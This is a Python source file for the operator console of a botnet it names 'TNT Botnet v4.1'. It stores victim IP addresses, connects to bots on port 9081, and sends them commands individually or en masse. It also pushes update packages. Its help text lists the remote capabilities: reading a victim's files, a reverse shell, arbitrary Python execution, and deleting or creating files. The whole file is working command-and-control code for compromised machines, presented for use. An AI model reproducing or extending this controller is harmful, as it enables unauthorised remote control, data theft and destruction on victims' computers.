import socket, platform, os
#CONSTANTS ADDED
answerable_cmdlets = ["cat", "selftest", "ls"]
onearg_cmdlets = ["cat", "shell", "talk", "execpy", "mkdir", "rmdir", "rm", "ls"]
doublearg_cmdlets = ["file", "message"]
#-------------------------------------------------------------------
def add_a_bot(botnet_exemplars_ipv4):
    with open("botbase.txt", "a") as database:
        database.write(botnet_exemplars_ipv4+";")
        database.close()
#-------------------------------------------------------------------
def GetInfoOfTheBot(botnet_exemplars_ipv4):
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((botnet_exemplars_ipv4, 9081))
        sock.settimeout(None)
        sock.send("selftest".encode("utf-8"))
        version = sock.recv(16384).decode("utf-8")
        if platform.system() == "Windows":
            return "[*] Bot "+botnet_exemplars_ipv4+" with TNT version "+version
        if platform.system() == "Linux":
            return "\u001b[39m[\u001b[92m*\u001b[39m] Bot \u001b[33m"+botnet_exemplars_ipv4+"\u001b[39m with TNT version "+version
    except:
        if platform.system() == "Windows":
            return "[*] Bot "+botnet_exemplars_ipv4+" is not avaliable!"
        if platform.system() == "Linux":
            return "\u001b[39m[\u001b[31m*\u001b[39m] Bot \u001b[33m"+botnet_exemplars_ipv4+"\u001b[39m is not avaliable!"
#-------------------------------------------------------------------
def extract_botnet_hostlist():
    bots_ipv4s_list = []
    with open("botbase.txt", "r") as botbase:
        bots_ipv4s_list = botbase.read().split(";")
        botbase.close()
    return bots_ipv4s_list
#-------------------------------------------------------------------
def attack_a_bot(botnet_exemplars_ipv4, commandlet):
    if (botnet_exemplars_ipv4 != "" and botnet_exemplars_ipv4 != " " and botnet_exemplars_ipv4 != None):
        sock = socket.socket()
        sock.settimeout(2)
        try:
            sock.connect((botnet_exemplars_ipv4, 9081))
        except TimeoutError:
            print(f"[{botnet_exemplars_ipv4}] - [{commandlet}] Timed out")
            return
        sock.settimeout(None)
        sock.send(commandlet.encode("utf-8"))
        if commandlet in doublearg_cmdlets:
            firstarg = input(cmds["require_option"])
            sock.send(firstarg.encode("utf-8"))
            secondarg = input(cmds["require_option"])
            sock.send(secondarg.encode("utf-8"))
        if commandlet in onearg_cmdlets:
            firstarg = input(cmds["require_option"])
            sock.send(firstarg.encode("utf-8"))
        if commandlet in answerable_cmdlets:
            ans = sock.recv(16384).decode("utf-8")
            print(cmds["Answer_from_bot"]+ans)
        sock.close()
    else:
        print("Incorrect bot!")
#-------------------------------------------------------------------
def remote_update(bot, pack_of_update):
    sock = socket.socket();sock.connect((bot, 9081))
    sock.send("update".encode("utf-8"))
    sock.send(open(pack_of_update, "rb").read())
    sock.close()
#-------------------------------------------------------------------
def clear_screen():
    if platform.system() == "Windows": os.system("cls")
    if platform.system() == "Linux": os.system("clear")
#-------------------------------------------------------------------
if platform.system() == "Windows":
    cmds = {
        "success": "[*] Success!",
        "rerun_please": "[*] Rerun program to complete the changes!",
        "mass_shell": "commander@botnet > ",
        "bye": "Thanks for using this tool!",
        "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot\n[6] Avaliable commands",
        "Greetings": "Bot Controller For TNT Botnet v4.1",
        "Answer_from_bot": "[*] Bot sent answer:\n",
        "require_option": "[?] This commandlet requires an option: ",
        "proc1": "[*] Searching for bases...",
        "proc2": "[*] Base found!",
        "no_bots_error": "[*] No bots were attached yet!"
    }
if platform.system() == "Linux":
    cmds = {
        "success": "\u001b[39m[\u001b[92m*\u001b[39m] Success!",
        "rerun_please": "\u001b[39m[\u001b[31m*\u001b[39m] Rerun program to complete the changes!",
        "mass_shell": "\u001b[31mcommander\u001b[39m@\u001b[33mbotnet\u001b[39m > ",
        "bye": "\u001b[32mThanks for using this tool\u001b[39m",
        "cmds": '''
\u001b[39m[\u001b[36m1\u001b[39m] View loaded bots
\u001b[39m[\u001b[36m2\u001b[39m] Attack one bot
\u001b[39m[\u001b[36m3\u001b[39m] Mass attack
\u001b[39m[\u001b[36m4\u001b[39m] Attach a bot
\u001b[39m[\u001b[36m5\u001b[39m] Update bot
\u001b[39m[\u001b[36m6\u001b[39m] Avaliable commands''',
        "Greetings": "\u001b[31mBot Controller For TNT Botnet \u001b[31mv4.1\u001b[39m\n\n\n",
        "Answer_from_bot": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Bot sent answer:\u001b[39m\n",
        "require_option": "\u001b[39m[\u001b[33m?\u001b[39m]\u001b[93m This commandlet requires an option:\u001b[39m ",
        "proc1": "\u001b[39m[\u001b[33m*\u001b[39m]\u001b[33m Searching for bases...",
        "proc2": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Base found!",
        "no_bots_error": "\u001b[39m[\u001b[31m*\u001b[39m] No bots were attached yet!"
    }
if platform.system() == "Windows":
    help_message = '''
Commands avaliable:
[cat] = Read a victim's file
[shell] = CMD Reverse shell
[cdjoke] = Tryes to open CDRom
[selftest] = Returns a version of TNT
[ls] = Listen directory
[talk] = Talks to victim via VBS
[execpy] = Execute any python command
[mkdir] = Adds directory
[rmdir] = Removes directory
[rm] = Removes file
[file] = Creates file with any content
[message] = pull a message out
[fun] = Opens something
[nice] = Starts fireshow
[update] = doesn't work yet :(
'''
if platform.system() == "Linux":
    help_message = '''
\u001b[31mCommands avaliable\u001b[39m:
\u001b[34m[\u001b[32mcat\u001b[34m]\u001b[39m = Read a victim's file
\u001b[34m[\u001b[31mshell\u001b[34m]\u001b[39m = CMD Reverse shell
\u001b[34m[\u001b[31mcdjoke\u001b[34m]\u001b[39m = Tryes to open CDRom
\u001b[34m[\u001b[32mselftest\u001b[34m]\u001b[39m = Returns a version of TNT
\u001b[34m[\u001b[32mls\u001b[34m]\u001b[39m = Listen directory
\u001b[34m[\u001b[31mtalk\u001b[34m]\u001b[39m = Talks to victim via VBS
\u001b[34m[\u001b[31mexecpy\u001b[34m]\u001b[39m = Execute any python command
\u001b[34m[\u001b[32mmkdir\u001b[34m]\u001b[39m = Adds directory
\u001b[34m[\u001b[33mrmdir\u001b[34m]\u001b[39m = Removes directory
\u001b[34m[\u001b[33mrm\u001b[34m]\u001b[39m = Removes file
\u001b[34m[\u001b[33mfile\u001b[34m]\u001b[39m = Creates file with any content
\u001b[34m[\u001b[31mmessage\u001b[34m]\u001b[39m = pull a message out
\u001b[34m[\u001b[32mfun\u001b[34m]\u001b[39m = Opens something
\u001b[34m[\u001b[33mnice\u001b[34m]\u001b[39m = Starts fireshow
\u001b[34m[\u001b[32mupdate\u001b[34m]\u001b[39m = doesn't work yet :(
'''
#-------------------------------------------------------------------
#MAIN CYCLE OF THE PROGRAM GOES THERE
#-------------------------------------------------------------------
try:
    clear_screen()
    print(cmds["Greetings"])
    print(cmds["proc1"])
    if os.path.isfile("botbase.txt") == True:
        print(cmds["proc2"])
        bots_ipv4s_list = extract_botnet_hostlist()
        if "" in bots_ipv4s_list:
            bots_ipv4s_list.remove("")
        if " " in bots_ipv4s_list:
            bots_ipv4s_list.remove(" ")
    else:bots_ipv4s_list = None
    while True:
        print(cmds["cmds"])
        com = input()
        if int(com) == 1:
            if (bots_ipv4s_list != None):
                for one_bot in bots_ipv4s_list:
                    print(GetInfoOfTheBot(one_bot))
            else: print(cmds["no_bots_error"])
        elif int(com) == 2:
            i = 0
            if (bots_ipv4s_list != None):
                for one_bot in bots_ipv4s_list:
                    if platform.system() == "Windows":
                        print("["+str(i)+"] "+GetInfoOfTheBot(one_bot))
                    elif platform.system() == "Linux":
                        print("\u001b[39m[\u001b[31m"+str(i)+"\u001b[39m] "+GetInfoOfTheBot(one_bot))
                    i+=1
                attack_a_bot(bots_ipv4s_list[int(input(cmds["require_option"]))], input(cmds["require_option"]))
            else: print(cmds["no_bots_error"])
        elif int(com) == 3:
            if bots_ipv4s_list != None:
                com = input(cmds["mass_shell"])
                for one_bot in bots_ipv4s_list:
                    attack_a_bot(one_bot, com)
            else:print(cmds["no_bots_error"])
        elif int(com) == 4:
            add_a_bot(input(cmds["require_option"]).strip())
            print(cmds["rerun_please"])
        elif int(com) == 5:
            i=0
            packet = input(cmds["require_option"])
            for one_bot in bots_ipv4s_list:
                if platform.system() == "Windows":
                    print("["+str(i)+"] "+GetInfoOfTheBot(one_bot))
                elif platform.system() == "Linux":
                    print("\u001b[39m[\u001b[31m"+str(i)+"\u001b[39m] "+GetInfoOfTheBot(one_bot))
                i+=1
            bot = input(cmds["require_option"])
            remote_update(bots_ipv4s_list[int(bot)], packet)
            print(cmds["success"])
        elif int(com) == 6:
            print(help_message)
        input("\n\n\nPress enter to continue")
        clear_screen()

except KeyboardInterrupt:
    clear_screen()
    print(cmds["bye"])
    input("\n\n\nPress enter to continue")
